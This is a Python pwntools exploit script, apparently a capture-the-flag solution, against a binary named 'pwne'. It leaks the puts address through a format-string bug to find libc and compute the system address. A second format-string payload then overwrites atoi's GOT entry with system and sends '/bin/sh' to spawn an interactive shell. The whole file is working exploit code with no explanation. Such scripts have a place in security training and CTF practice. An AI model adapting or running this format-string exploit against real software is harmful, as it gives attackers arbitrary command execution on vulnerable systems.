#!/usr/bin/python
from pwn import *
#context.log_level = 'debug'
elf = ELF('./pwne')
sh = process('./pwne')
#libc = ELF('./libc.so.6')
libc = elf.libc

system_off = libc.symbols['system']
puts_off = libc.symbols['puts']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']

sh.recvuntil('WANT PLAY[Y/N]\n')
sh.sendline('Y')
sh.recvuntil("GET YOUR NAME:\n\n")
#sh.recvuntil('\n')
sh.sendline(p32(puts_got)+'%7$s')
sh.recvuntil('WELCOME \n')
puts = u32(sh.recv()[4:8])
libc_base = puts - puts_off
system = libc_base + system_off
sh.sendline('2')#have recieved all data

sh.recvuntil('WANT PLAY[Y/N]\n')
sh.sendline('Y')
sh.recvuntil("GET YOUR NAME:\n\n")
#sh.recvuntil('\n')
sh.sendline(fmtstr_payload(7,{atoi_got: system}))
success('fmt_str is:'+ fmtstr_payload(7,{atoi_got: system}))
sh.recvuntil('AGE:\n')
sh.recvuntil('\n')
sh.send('/bin/sh\x00')
sh.interactive()
